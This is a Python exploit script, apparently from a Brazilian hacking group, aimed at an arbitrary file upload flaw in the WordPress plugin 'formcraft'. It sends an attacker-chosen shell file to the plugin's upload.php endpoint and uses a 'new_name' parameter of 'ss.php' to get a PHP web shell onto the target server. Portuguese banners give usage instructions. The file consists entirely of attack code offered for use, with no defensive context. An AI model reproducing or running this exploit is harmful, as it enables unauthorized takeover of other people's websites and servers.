import requests
import sys

banner_help = """
__     __          _                  _____                   
\ \   / /         | |                / ____|                  
 \ \_/ /   _ _ __ | | _____ _ __ ___| |     _ __ _____      __
  \   / | | | '_ \| |/ / _ \ '__/ __| |    | '__/ _ \ \ /\ / /
   | || |_| | | | |   <  __/ |  \__ \ |____| | |  __/\ V  V / 
   |_| \__,_|_| |_|_|\_\___|_|  |___/\_____|_|  \___| \_/\_/  
                                          Recoda nao comedia  
WordPress Plugin "formcraft" exploit - Arbitrary File Upload - www.fb.com/yunkers01/      
Exploit coded by supr3m0 & w4rlo6k                                    
==============================================================
Parametros:

--url = site alvo (http://localhost/)
--arquivo = shell (shell.txt - nao aceita .php e etc...)
(use: python exploit.py --url http://localhost/ --arquivo shell.php

[-] Erro interno.
"""
banner_menu = """
__     __          _                  _____                   
\ \   / /         | |                / ____|                  
 \ \_/ /   _ _ __ | | _____ _ __ ___| |     _ __ _____      __
  \   / | | | '_ \| |/ / _ \ '__/ __| |    | '__/ _ \ \ /\ / /
   | || |_| | | | |   <  __/ |  \__ \ |____| | |  __/\ V  V / 
   |_| \__,_|_| |_|_|\_\___|_|  |___/\_____|_|  \___| \_/\_/  
                                          Recoda nao comedia  
WordPress Plugin "formcraft" exploit - Arbitrary File Upload - www.fb.com/yunkers01/      
Exploit coded by supr3m0 & w4rlo6k                                    
==============================================================
Executando testes antes de iniciar o exploit...
[+] Aguarde(...)
"""

x = sys.argv
script = x[0]
if len(x) != 5:
    print(banner_help)
    exit()

if x[1] == "--url":
    url = x[2]
else:
    print(banner_help)
    exit()
if x[3] == "--arquivo":
    arquivo = x[4]
else:
    print(banner_help)
    exit()

print(banner_menu)
try:
    if url[:8] != "https://" and url[:7] != "http://":
         print('[-] Tipo de URL invalida.')
         exit()
    else:
        print("[*] Site:",url)
        print("[*] Arquivo:",arquivo)
        testa_conexao = requests.get(url)
        if testa_conexao.status_code == 200:
            print("\n[#] Executando exploit(...)")
        else:
            print("[-] Site fora do ar")
            exit()
except: 
    print("")
############################### EXECUTA EXPLOIT ###############################
upload = url + "/wp-content/plugins/formcraft/file-upload/server/content/upload.php"
#path = url + "/wp-content/plugins/formcraft/file-upload/server/content/files/" + ext
shell = open(arquivo, "r")
payload = {"files[]" : shell}
bypass = {"new_name" : "ss.php"}
falha = "ERRO" or "ERROR" or "falied" or "failed" or "Not allowed"
try:
    req_up = requests.get(upload)
    if req_up.status_code == 200:
        print("[#] Enviando arquivo(...)")
        envia = requests.post(upload,data=bypass, files=payload)
        if envia.status_code == 200:
            if falha in envia.text:
                print("[!] Erro ao enviar o arquivo:")
                print(envia.text)
            else:
                if "new_name" in envia.text:
                    print("[+] Exploit executado com sucesso!\n")
                    print(envia.text)
        else:
            print("[-] Nao consegui me conectar ao diretorio de upload :/")
    else:
        print("[-] Nao consegui me conectar na URL :/\n\n\n")
        print(req_up.text)
        exit()
except:
    print("")